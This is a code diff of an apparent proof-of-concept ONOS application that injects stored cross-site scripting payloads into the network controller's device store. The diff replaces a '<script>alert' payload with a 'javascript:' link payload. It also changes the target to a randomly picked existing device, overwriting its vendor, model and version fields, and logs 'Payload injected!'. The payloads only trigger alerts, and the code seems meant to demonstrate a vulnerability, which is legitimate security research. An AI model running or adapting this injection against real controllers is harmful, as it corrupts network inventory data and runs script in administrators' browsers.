@@ -33,6 +33,19 @@ import org.onosproject.net.device.DefaultDeviceDescription;
 import org.onosproject.net.provider.ProviderId;
 import java.io.StringWriter;
 import java.io.PrintWriter;
+import org.onosproject.net.host.HostService;
+import org.onosproject.net.host.HostStore;
+import org.onosproject.net.Host;
+import org.onosproject.net.HostId;
+import org.onosproject.net.HostLocation;
+import org.onosproject.net.device.DeviceService;
+import org.onosproject.net.Port;
+import java.util.Timer;
+import java.util.Random;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Set;
+import java.util.TimerTask;
 
 /**
  * XSS device POC application
@@ -42,13 +55,16 @@ public class XssDevicePoc {
 
     private final Logger log = LoggerFactory.getLogger(getClass());
 
-    private final String PAYLOAD = "\"<script>alert(\'maremma bucaiola\')</script>";
+    private final String PAYLOAD = "<a href=javascript:alert(1)>CLICKME</a>";
 
     @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
     protected CoreService coreService;
 
     @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
     protected DeviceStore deviceStore;
+
+    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
+    protected DeviceService deviceService;
 
     @Activate
     protected void activate() {
@@ -66,9 +82,9 @@ public class XssDevicePoc {
         try {
             URI uri = new URI("javascript:alert(1)");
 
-            DeviceId dId = DeviceId.deviceId(uri);
+            DeviceId dId = pickRandomDevice().id();
 
-            ChassisId cId = new ChassisId(1);
+            ChassisId cId = new ChassisId(5);
 
             DefaultAnnotations sa = DefaultAnnotations.builder().build();
 
@@ -76,7 +92,7 @@ public class XssDevicePoc {
                     PAYLOAD, PAYLOAD, PAYLOAD, cId, sa);
             deviceStore.createOrUpdateDevice(ProviderId.NONE, dId, deviceDescription);
 
-            log.info("ciao");
+            log.info("Payload injected!");
 
         } catch (Exception e) {
             e.printStackTrace();
@@ -86,5 +102,16 @@ public class XssDevicePoc {
             log.info(sw.toString());
             log.info("exception!!!!!!11!!!!11!");
         }
+    }
+
+    // pickRandomDevice picks a random device
+    private Device pickRandomDevice() {
+        Iterable<Device> devices = deviceService.getDevices();
+        Random rand = new Random();
+        List<Device> deviceList = new ArrayList<Device>();
+        devices.forEach(deviceList::add);
+        Device randomDevice = deviceList.get(rand.nextInt(deviceList.size()));
+
+        return randomDevice;
     }
 }
